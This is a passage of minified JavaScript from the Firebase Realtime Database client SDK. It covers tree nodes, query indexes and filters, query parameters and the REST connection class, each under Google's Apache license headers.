 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let RE;class En{static set __childrenNodeConstructor(e){RE=e}static get __childrenNodeConstructor(){return RE}constructor(e,n=En.__childrenNodeConstructor.EMPTY_NODE){this.value_=e,this.priorityNode_=n,this.lazyHash_=null,ye(this.value_!==void 0&&this.value_!==null,"LeafNode shouldn't be created with null/undefined value."),AN(this.priorityNode_)}isLeafNode(){return!0}getPriority(){return this.priorityNode_}updatePriority(e){return new En(this.value_,e)}getImmediateChild(e){return e===".priority"?this.priorityNode_:En.__childrenNodeConstructor.EMPTY_NODE}getChild(e){return lt(e)?this:et(e)===".priority"?this.priorityNode_:En.__childrenNodeConstructor.EMPTY_NODE}hasChild(){return!1}getPredecessorChildName(e,n){return null}updateImmediateChild(e,n){return e===".priority"?this.updatePriority(n):n.isEmpty()&&e!==".priority"?this:En.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(e,n).updatePriority(this.priorityNode_)}updateChild(e,n){const i=et(e);return i===null?n:n.isEmpty()&&i!==".priority"?this:(ye(i!==".priority"||Ka(e)===1,".priority must be the last token in a path"),this.updateImmediateChild(i,En.__childrenNodeConstructor.EMPTY_NODE.updateChild(Bt(e),n)))}isEmpty(){return!1}numChildren(){return 0}forEachChild(e,n){return!1}val(e){return e&&!this.getPriority().isEmpty()?{".value":this.getValue(),".priority":this.getPriority().val()}:this.getValue()}hash(){if(this.lazyHash_===null){let e="";this.priorityNode_.isEmpty()||(e+="priority:"+xN(this.priorityNode_.val())+":");const n=typeof this.value_;e+=n+":",n==="number"?e+=eN(this.value_):e+=this.value_,this.lazyHash_=Z4(e)}return this.lazyHash_}getValue(){return this.value_}compareTo(e){return e===En.__childrenNodeConstructor.EMPTY_NODE?1:e instanceof En.__childrenNodeConstructor?-1:(ye(e.isLeafNode(),"Unknown node type"),this.compareToLeafNode_(e))}compareToLeafNode_(e){const n=typeof e.value_,i=typeof this.value_,s=En.VALUE_TYPE_ORDER.indexOf(n),o=En.VALUE_TYPE_ORDER.indexOf(i);return ye(s>=0,"Unknown leaf type: "+n),ye(o>=0,"Unknown leaf type: "+i),s===o?i==="object"?0:this.value_<e.value_?-1:this.value_===e.value_?0:1:o-s}withIndex(){return this}isIndexed(){return!0}equals(e){if(e===this)return!0;if(e.isLeafNode()){const n=e;return this.value_===n.value_&&this.priorityNode_.equals(n.priorityNode_)}else return!1}}En.VALUE_TYPE_ORDER=["object","boolean","number","string"];/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let EN,TN;function UV(t){EN=t}function BV(t){TN=t}class zV extends Np{compare(e,n){const i=e.node.getPriority(),s=n.node.getPriority(),o=i.compareTo(s);return o===0?rl(e.name,n.name):o}isDefinedOn(e){return!e.getPriority().isEmpty()}indexedValueChanged(e,n){return!e.getPriority().equals(n.getPriority())}minPost(){return nt.MIN}maxPost(){return new nt(Yo,new En("[PRIORITY-POST]",TN))}makePost(e,n){const i=EN(e);return new nt(n,new En("[PRIORITY-POST]",i))}toString(){return".priority"}}const Wt=new zV;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const FV=Math.log(2);class HV{constructor(e){const n=o=>parseInt(Math.log(o)/FV,10),i=o=>parseInt(Array(o+1).join("1"),2);this.count=n(e+1),this.current_=this.count-1;const s=i(this.count);this.bits_=e+1&s}nextBitIsOne(){const e=!(this.bits_&1<<this.current_);return this.current_--,e}}const Pm=function(t,e,n,i){t.sort(e);const s=function(f,p){const v=p-f;let b,w;if(v===0)return null;if(v===1)return b=t[f],w=n?n(b):b,new Cn(w,b.node,Cn.BLACK,null,null);{const E=parseInt(v/2,10)+f,C=s(f,E),M=s(E+1,p);return b=t[E],w=n?n(b):b,new Cn(w,b.node,Cn.BLACK,C,M)}},o=function(f){let p=null,v=null,b=t.length;const w=function(C,M){const V=b-C,B=b;b-=C;const Y=s(V+1,B),D=t[V],Q=n?n(D):D;E(new Cn(Q,D.node,M,null,Y))},E=function(C){p?(p.left=C,p=C):(v=C,p=C)};for(let C=0;C<f.count;++C){const M=f.nextBitIsOne(),V=Math.pow(2,f.count-(C+1));M?w(V,Cn.BLACK):(w(V,Cn.BLACK),w(V,Cn.RED))}return v},c=new HV(t.length),d=o(c);return new vi(i||e,d)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let p0;const Yl={};class Ms{static get Default(){return ye(Yl&&Wt,"ChildrenNode.ts has not been loaded"),p0=p0||new Ms({".priority":Yl},{".priority":Wt}),p0}constructor(e,n){this.indexes_=e,this.indexSet_=n}get(e){const n=fc(this.indexes_,e);if(!n)throw new Error("No index defined for "+e);return n instanceof vi?n:null}hasIndex(e){return ns(this.indexSet_,e.toString())}addIndex(e,n){ye(e!==oc,"KeyIndex always exists and isn't meant to be added to the IndexMap.");const i=[];let s=!1;const o=n.getIterator(nt.Wrap);let c=o.getNext();for(;c;)s=s||e.isDefinedOn(c.node),i.push(c),c=o.getNext();let d;s?d=Pm(i,e.getCompare()):d=Yl;const f=e.toString(),p=Object.assign({},this.indexSet_);p[f]=e;const v=Object.assign({},this.indexes_);return v[f]=d,new Ms(v,p)}addToIndexes(e,n){const i=hm(this.indexes_,(s,o)=>{const c=fc(this.indexSet_,o);if(ye(c,"Missing index implementation for "+o),s===Yl)if(c.isDefinedOn(e.node)){const d=[],f=n.getIterator(nt.Wrap);let p=f.getNext();for(;p;)p.name!==e.name&&d.push(p),p=f.getNext();return d.push(e),Pm(d,c.getCompare())}else return Yl;else{const d=n.get(e.name);let f=s;return d&&(f=f.remove(new nt(e.name,d))),f.insert(e,e.node)}});return new Ms(i,this.indexSet_)}removeFromIndexes(e,n){const i=hm(this.indexes_,s=>{if(s===Yl)return s;{const o=n.get(e.name);return o?s.remove(new nt(e.name,o)):s}});return new Ms(i,this.indexSet_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let $u;class He{static get EMPTY_NODE(){return $u||($u=new He(new vi(iw),null,Ms.Default))}constructor(e,n,i){this.children_=e,this.priorityNode_=n,this.indexMap_=i,this.lazyHash_=null,this.priorityNode_&&AN(this.priorityNode_),this.children_.isEmpty()&&ye(!this.priorityNode_||this.priorityNode_.isEmpty(),"An empty node cannot have a priority")}isLeafNode(){return!1}getPriority(){return this.priorityNode_||$u}updatePriority(e){return this.children_.isEmpty()?this:new He(this.children_,e,this.indexMap_)}getImmediateChild(e){if(e===".priority")return this.getPriority();{const n=this.children_.get(e);return n===null?$u:n}}getChild(e){const n=et(e);return n===null?this:this.getImmediateChild(n).getChild(Bt(e))}hasChild(e){return this.children_.get(e)!==null}updateImmediateChild(e,n){if(ye(n,"We should always be passing snapshot nodes"),e===".priority")return this.updatePriority(n);{const i=new nt(e,n);let s,o;n.isEmpty()?(s=this.children_.remove(e),o=this.indexMap_.removeFromIndexes(i,this.children_)):(s=this.children_.insert(e,n),o=this.indexMap_.addToIndexes(i,this.children_));const c=s.isEmpty()?$u:this.priorityNode_;return new He(s,c,o)}}updateChild(e,n){const i=et(e);if(i===null)return n;{ye(et(e)!==".priority"||Ka(e)===1,".priority must be the last token in a path");const s=this.getImmediateChild(i).updateChild(Bt(e),n);return this.updateImmediateChild(i,s)}}isEmpty(){return this.children_.isEmpty()}numChildren(){return this.children_.count()}val(e){if(this.isEmpty())return null;const n={};let i=0,s=0,o=!0;if(this.forEachChild(Wt,(c,d)=>{n[c]=d.val(e),i++,o&&He.INTEGER_REGEXP_.test(c)?s=Math.max(s,Number(c)):o=!1}),!e&&o&&s<2*i){const c=[];for(const d in n)c[d]=n[d];return c}else return e&&!this.getPriority().isEmpty()&&(n[".priority"]=this.getPriority().val()),n}hash(){if(this.lazyHash_===null){let e="";this.getPriority().isEmpty()||(e+="priority:"+xN(this.getPriority().val())+":"),this.forEachChild(Wt,(n,i)=>{const s=i.hash();s!==""&&(e+=":"+n+":"+s)}),this.lazyHash_=e===""?"":Z4(e)}return this.lazyHash_}getPredecessorChildName(e,n,i){const s=this.resolveIndex_(i);if(s){const o=s.getPredecessorKey(new nt(e,n));return o?o.name:null}else return this.children_.getPredecessorKey(e)}getFirstChildName(e){const n=this.resolveIndex_(e);if(n){const i=n.minKey();return i&&i.name}else return this.children_.minKey()}getFirstChild(e){const n=this.getFirstChildName(e);return n?new nt(n,this.children_.get(n)):null}getLastChildName(e){const n=this.resolveIndex_(e);if(n){const i=n.maxKey();return i&&i.name}else return this.children_.maxKey()}getLastChild(e){const n=this.getLastChildName(e);return n?new nt(n,this.children_.get(n)):null}forEachChild(e,n){const i=this.resolveIndex_(e);return i?i.inorderTraversal(s=>n(s.name,s.node)):this.children_.inorderTraversal(n)}getIterator(e){return this.getIteratorFrom(e.minPost(),e)}getIteratorFrom(e,n){const i=this.resolveIndex_(n);if(i)return i.getIteratorFrom(e,s=>s);{const s=this.children_.getIteratorFrom(e.name,nt.Wrap);let o=s.peek();for(;o!=null&&n.compare(o,e)<0;)s.getNext(),o=s.peek();return s}}getReverseIterator(e){return this.getReverseIteratorFrom(e.maxPost(),e)}getReverseIteratorFrom(e,n){const i=this.resolveIndex_(n);if(i)return i.getReverseIteratorFrom(e,s=>s);{const s=this.children_.getReverseIteratorFrom(e.name,nt.Wrap);let o=s.peek();for(;o!=null&&n.compare(o,e)>0;)s.getNext(),o=s.peek();return s}}compareTo(e){return this.isEmpty()?e.isEmpty()?0:-1:e.isLeafNode()||e.isEmpty()?1:e===th?-1:0}withIndex(e){if(e===oc||this.indexMap_.hasIndex(e))return this;{const n=this.indexMap_.addIndex(e,this.children_);return new He(this.children_,this.priorityNode_,n)}}isIndexed(e){return e===oc||this.indexMap_.hasIndex(e)}equals(e){if(e===this)return!0;if(e.isLeafNode())return!1;{const n=e;if(this.getPriority().equals(n.getPriority()))if(this.children_.count()===n.children_.count()){const i=this.getIterator(Wt),s=n.getIterator(Wt);let o=i.getNext(),c=s.getNext();for(;o&&c;){if(o.name!==c.name||!o.node.equals(c.node))return!1;o=i.getNext(),c=s.getNext()}return o===null&&c===null}else return!1;else return!1}}resolveIndex_(e){return e===oc?null:this.indexMap_.get(e.toString())}}He.INTEGER_REGEXP_=/^(0|[1-9]\d*)$/;class qV extends He{constructor(){super(new vi(iw),He.EMPTY_NODE,Ms.Default)}compareTo(e){return e===this?0:1}equals(e){return e===this}getPriority(){return this}getImmediateChild(e){return He.EMPTY_NODE}isEmpty(){return!1}}const th=new qV;Object.defineProperties(nt,{MIN:{value:new nt(Ac,He.EMPTY_NODE)},MAX:{value:new nt(Yo,th)}});bN.__EMPTY_NODE=He.EMPTY_NODE;En.__childrenNodeConstructor=He;VV(th);BV(th);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const GV=!0;function Sn(t,e=null){if(t===null)return He.EMPTY_NODE;if(typeof t=="object"&&".priority"in t&&(e=t[".priority"]),ye(e===null||typeof e=="string"||typeof e=="number"||typeof e=="object"&&".sv"in e,"Invalid priority type found: "+typeof e),typeof t=="object"&&".value"in t&&t[".value"]!==null&&(t=t[".value"]),typeof t!="object"||".sv"in t){const n=t;return new En(n,Sn(e))}if(!(t instanceof Array)&&GV){const n=[];let i=!1;if(zn(t,(c,d)=>{if(c.substring(0,1)!=="."){const f=Sn(d);f.isEmpty()||(i=i||!f.getPriority().isEmpty(),n.push(new nt(c,f)))}}),n.length===0)return He.EMPTY_NODE;const o=Pm(n,LV,c=>c.name,iw);if(i){const c=Pm(n,Wt.getCompare());return new He(o,Sn(e),new Ms({".priority":c},{".priority":Wt}))}else return new He(o,Sn(e),Ms.Default)}else{let n=He.EMPTY_NODE;return zn(t,(i,s)=>{if(ns(t,i)&&i.substring(0,1)!=="."){const o=Sn(s);(o.isLeafNode()||!o.isEmpty())&&(n=n.updateImmediateChild(i,o))}}),n.updatePriority(Sn(e))}}UV(Sn);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YV extends Np{constructor(e){super(),this.indexPath_=e,ye(!lt(e)&&et(e)!==".priority","Can't create PathIndex with empty path or .priority key")}extractChild(e){return e.getChild(this.indexPath_)}isDefinedOn(e){return!e.getChild(this.indexPath_).isEmpty()}compare(e,n){const i=this.extractChild(e.node),s=this.extractChild(n.node),o=i.compareTo(s);return o===0?rl(e.name,n.name):o}makePost(e,n){const i=Sn(e),s=He.EMPTY_NODE.updateChild(this.indexPath_,i);return new nt(n,s)}maxPost(){const e=He.EMPTY_NODE.updateChild(this.indexPath_,th);return new nt(Yo,e)}toString(){return Nd(this.indexPath_,0).join("/")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class QV extends Np{compare(e,n){const i=e.node.compareTo(n.node);return i===0?rl(e.name,n.name):i}isDefinedOn(e){return!0}indexedValueChanged(e,n){return!e.equals(n)}minPost(){return nt.MIN}maxPost(){return nt.MAX}makePost(e,n){const i=Sn(e);return new nt(n,i)}toString(){return".value"}}const KV=new QV;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function CN(t){return{type:"value",snapshotNode:t}}function Ec(t,e){return{type:"child_added",snapshotNode:e,childName:t}}function Rd(t,e){return{type:"child_removed",snapshotNode:e,childName:t}}function Id(t,e,n){return{type:"child_changed",snapshotNode:e,childName:t,oldSnap:n}}function WV(t,e){return{type:"child_moved",snapshotNode:e,childName:t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rw{constructor(e){this.index_=e}updateChild(e,n,i,s,o,c){ye(e.isIndexed(this.index_),"A node must be indexed if only a child is updated");const d=e.getImmediateChild(n);return d.getChild(s).equals(i.getChild(s))&&d.isEmpty()===i.isEmpty()||(c!=null&&(i.isEmpty()?e.hasChild(n)?c.trackChildChange(Rd(n,d)):ye(e.isLeafNode(),"A child remove without an old child only makes sense on a leaf node"):d.isEmpty()?c.trackChildChange(Ec(n,i)):c.trackChildChange(Id(n,i,d))),e.isLeafNode()&&i.isEmpty())?e:e.updateImmediateChild(n,i).withIndex(this.index_)}updateFullNode(e,n,i){return i!=null&&(e.isLeafNode()||e.forEachChild(Wt,(s,o)=>{n.hasChild(s)||i.trackChildChange(Rd(s,o))}),n.isLeafNode()||n.forEachChild(Wt,(s,o)=>{if(e.hasChild(s)){const c=e.getImmediateChild(s);c.equals(o)||i.trackChildChange(Id(s,o,c))}else i.trackChildChange(Ec(s,o))})),n.withIndex(this.index_)}updatePriority(e,n){return e.isEmpty()?He.EMPTY_NODE:e.updatePriority(n)}filtersNodes(){return!1}getIndexedFilter(){return this}getIndex(){return this.index_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kd{constructor(e){this.indexedFilter_=new rw(e.getIndex()),this.index_=e.getIndex(),this.startPost_=kd.getStartPost_(e),this.endPost_=kd.getEndPost_(e),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}getStartPost(){return this.startPost_}getEndPost(){return this.endPost_}matches(e){const n=this.startIsInclusive_?this.index_.compare(this.getStartPost(),e)<=0:this.index_.compare(this.getStartPost(),e)<0,i=this.endIsInclusive_?this.index_.compare(e,this.getEndPost())<=0:this.index_.compare(e,this.getEndPost())<0;return n&&i}updateChild(e,n,i,s,o,c){return this.matches(new nt(n,i))||(i=He.EMPTY_NODE),this.indexedFilter_.updateChild(e,n,i,s,o,c)}updateFullNode(e,n,i){n.isLeafNode()&&(n=He.EMPTY_NODE);let s=n.withIndex(this.index_);s=s.updatePriority(He.EMPTY_NODE);const o=this;return n.forEachChild(Wt,(c,d)=>{o.matches(new nt(c,d))||(s=s.updateImmediateChild(c,He.EMPTY_NODE))}),this.indexedFilter_.updateFullNode(e,s,i)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.indexedFilter_}getIndex(){return this.index_}static getStartPost_(e){if(e.hasStart()){const n=e.getIndexStartName();return e.getIndex().makePost(e.getIndexStartValue(),n)}else return e.getIndex().minPost()}static getEndPost_(e){if(e.hasEnd()){const n=e.getIndexEndName();return e.getIndex().makePost(e.getIndexEndValue(),n)}else return e.getIndex().maxPost()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $V{constructor(e){this.withinDirectionalStart=n=>this.reverse_?this.withinEndPost(n):this.withinStartPost(n),this.withinDirectionalEnd=n=>this.reverse_?this.withinStartPost(n):this.withinEndPost(n),this.withinStartPost=n=>{const i=this.index_.compare(this.rangedFilter_.getStartPost(),n);return this.startIsInclusive_?i<=0:i<0},this.withinEndPost=n=>{const i=this.index_.compare(n,this.rangedFilter_.getEndPost());return this.endIsInclusive_?i<=0:i<0},this.rangedFilter_=new kd(e),this.index_=e.getIndex(),this.limit_=e.getLimit(),this.reverse_=!e.isViewFromLeft(),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}updateChild(e,n,i,s,o,c){return this.rangedFilter_.matches(new nt(n,i))||(i=He.EMPTY_NODE),e.getImmediateChild(n).equals(i)?e:e.numChildren()<this.limit_?this.rangedFilter_.getIndexedFilter().updateChild(e,n,i,s,o,c):this.fullLimitUpdateChild_(e,n,i,o,c)}updateFullNode(e,n,i){let s;if(n.isLeafNode()||n.isEmpty())s=He.EMPTY_NODE.withIndex(this.index_);else if(this.limit_*2<n.numChildren()&&n.isIndexed(this.index_)){s=He.EMPTY_NODE.withIndex(this.index_);let o;this.reverse_?o=n.getReverseIteratorFrom(this.rangedFilter_.getEndPost(),this.index_):o=n.getIteratorFrom(this.rangedFilter_.getStartPost(),this.index_);let c=0;for(;o.hasNext()&&c<this.limit_;){const d=o.getNext();if(this.withinDirectionalStart(d))if(this.withinDirectionalEnd(d))s=s.updateImmediateChild(d.name,d.node),c++;else break;else continue}}else{s=n.withIndex(this.index_),s=s.updatePriority(He.EMPTY_NODE);let o;this.reverse_?o=s.getReverseIterator(this.index_):o=s.getIterator(this.index_);let c=0;for(;o.hasNext();){const d=o.getNext();c<this.limit_&&this.withinDirectionalStart(d)&&this.withinDirectionalEnd(d)?c++:s=s.updateImmediateChild(d.name,He.EMPTY_NODE)}}return this.rangedFilter_.getIndexedFilter().updateFullNode(e,s,i)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.rangedFilter_.getIndexedFilter()}getIndex(){return this.index_}fullLimitUpdateChild_(e,n,i,s,o){let c;if(this.reverse_){const b=this.index_.getCompare();c=(w,E)=>b(E,w)}else c=this.index_.getCompare();const d=e;ye(d.numChildren()===this.limit_,"");const f=new nt(n,i),p=this.reverse_?d.getFirstChild(this.index_):d.getLastChild(this.index_),v=this.rangedFilter_.matches(f);if(d.hasChild(n)){const b=d.getImmediateChild(n);let w=s.getChildAfterChild(this.index_,p,this.reverse_);for(;w!=null&&(w.name===n||d.hasChild(w.name));)w=s.getChildAfterChild(this.index_,w,this.reverse_);const E=w==null?1:c(w,f);if(v&&!i.isEmpty()&&E>=0)return o!=null&&o.trackChildChange(Id(n,i,b)),d.updateImmediateChild(n,i);{o!=null&&o.trackChildChange(Rd(n,b));const M=d.updateImmediateChild(n,He.EMPTY_NODE);return w!=null&&this.rangedFilter_.matches(w)?(o!=null&&o.trackChildChange(Ec(w.name,w.node)),M.updateImmediateChild(w.name,w.node)):M}}else return i.isEmpty()?e:v&&c(p,f)>=0?(o!=null&&(o.trackChildChange(Rd(p.name,p.node)),o.trackChildChange(Ec(n,i))),d.updateImmediateChild(n,i).updateImmediateChild(p.name,He.EMPTY_NODE)):e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sw{constructor(){this.limitSet_=!1,this.startSet_=!1,this.startNameSet_=!1,this.startAfterSet_=!1,this.endSet_=!1,this.endNameSet_=!1,this.endBeforeSet_=!1,this.limit_=0,this.viewFrom_="",this.indexStartValue_=null,this.indexStartName_="",this.indexEndValue_=null,this.indexEndName_="",this.index_=Wt}hasStart(){return this.startSet_}isViewFromLeft(){return this.viewFrom_===""?this.startSet_:this.viewFrom_==="l"}getIndexStartValue(){return ye(this.startSet_,"Only valid if start has been set"),this.indexStartValue_}getIndexStartName(){return ye(this.startSet_,"Only valid if start has been set"),this.startNameSet_?this.indexStartName_:Ac}hasEnd(){return this.endSet_}getIndexEndValue(){return ye(this.endSet_,"Only valid if end has been set"),this.indexEndValue_}getIndexEndName(){return ye(this.endSet_,"Only valid if end has been set"),this.endNameSet_?this.indexEndName_:Yo}hasLimit(){return this.limitSet_}hasAnchoredLimit(){return this.limitSet_&&this.viewFrom_!==""}getLimit(){return ye(this.limitSet_,"Only valid if limit has been set"),this.limit_}getIndex(){return this.index_}loadsAllData(){return!(this.startSet_||this.endSet_||this.limitSet_)}isDefault(){return this.loadsAllData()&&this.index_===Wt}copy(){const e=new sw;return e.limitSet_=this.limitSet_,e.limit_=this.limit_,e.startSet_=this.startSet_,e.startAfterSet_=this.startAfterSet_,e.indexStartValue_=this.indexStartValue_,e.startNameSet_=this.startNameSet_,e.indexStartName_=this.indexStartName_,e.endSet_=this.endSet_,e.endBeforeSet_=this.endBeforeSet_,e.indexEndValue_=this.indexEndValue_,e.endNameSet_=this.endNameSet_,e.indexEndName_=this.indexEndName_,e.index_=this.index_,e.viewFrom_=this.viewFrom_,e}}function XV(t){return t.loadsAllData()?new rw(t.getIndex()):t.hasLimit()?new $V(t):new kd(t)}function IE(t){const e={};if(t.isDefault())return e;let n;if(t.index_===Wt?n="$priority":t.index_===KV?n="$value":t.index_===oc?n="$key":(ye(t.index_ instanceof YV,"Unrecognized index type!"),n=t.index_.toString()),e.orderBy=Nn(n),t.startSet_){const i=t.startAfterSet_?"startAfter":"startAt";e[i]=Nn(t.indexStartValue_),t.startNameSet_&&(e[i]+=","+Nn(t.indexStartName_))}if(t.endSet_){const i=t.endBeforeSet_?"endBefore":"endAt";e[i]=Nn(t.indexEndValue_),t.endNameSet_&&(e[i]+=","+Nn(t.indexEndName_))}return t.limitSet_&&(t.isViewFromLeft()?e.limitToFirst=t.limit_:e.limitToLast=t.limit_),e}function kE(t){const e={};if(t.startSet_&&(e.sp=t.indexStartValue_,t.startNameSet_&&(e.sn=t.indexStartName_),e.sin=!t.startAfterSet_),t.endSet_&&(e.ep=t.indexEndValue_,t.endNameSet_&&(e.en=t.indexEndName_),e.ein=!t.endBeforeSet_),t.limitSet_){e.l=t.limit_;let n=t.viewFrom_;n===""&&(t.isViewFromLeft()?n="l":n="r"),e.vf=n}return t.index_!==Wt&&(e.i=t.index_.toString()),e}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class jm extends yN{reportStats(e){throw new Error("Method not implemented.")}static getListenId_(e,n){return n!==void 0?"tag$"+n:(ye(e._queryParams.isDefault(),"should have a tag if it's not a default query."),e._path.toString())}constructor(e,n,i,s){super(),this.repoInfo_=e,this.onDataUpdate_=n,this.authTokenProvider_=i,this.appCheckTokenProvider_=s,this.log_=eh("p:rest:"),this.listens_={}}listen(e,n,i,s){const o=e._path.toString();this.log_("Listen called for "+o+" "+e._queryIdentifier);const c=jm.getListenId_(e,i),d={};this.listens_[c]=d;const f=IE(e._queryParams);this.restRequest_(o+".json",f,(p,v)=>{let b=v;if(p===404&&(b=null,p=null),p===null&&this.onDataUpdate_(o,b,!1,i),fc(this.listens_,c)===d){let w;p?p===401?w="permission_denied":w="rest_error:"+p:w="ok",s(w,null)}})}unlisten(e,n){const i=jm.getListenId_(e,n);delete this.listens_[i]}get(e){const n=IE(e._queryParams),i=e._path.toString(),s=new Hd;return this.restRequest_(i+".json",n,(o,c)=>{let d=c;o===404&&(d=null,o=null),o===null?(this.onDataUpdate_(i,d,!1,null),s.resolve(d)):s.reject(new Error(d))}),s.promise}refreshAuthToken(e){}restRequest_(e,n={},i){return n.format="export",Promise.all([this.authTokenProvider_.getToken(!1),this.appCheckTokenProvider_.getToken(!1)]).then(([s,o])=>{s&&s.accessToken&&(n.auth=s.accessToken),o&&o.token&&(n.ac=o.token);const c=(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host+e+"?ns="+this.repoInfo_.namespace+Pc(n);this.log_("Sending REST request for "+c);const d=new XMLHttpRequest;d.onreadystatechange=()=>{if(i&&d.readyState===4){this.log_("REST Response for "+c+" received. status:",d.status,"response:",d.responseText);let f=null;if(d.status>=200&&d.status<300){try{f=yd(d.responseText)}catch{oi("Failed to parse JSON response for "+c+": "+d.responseText)}i(null,f)}else d.status!==401&&d.status!==404&&oi("Got unsuccessful REST response for "+c+" Status: 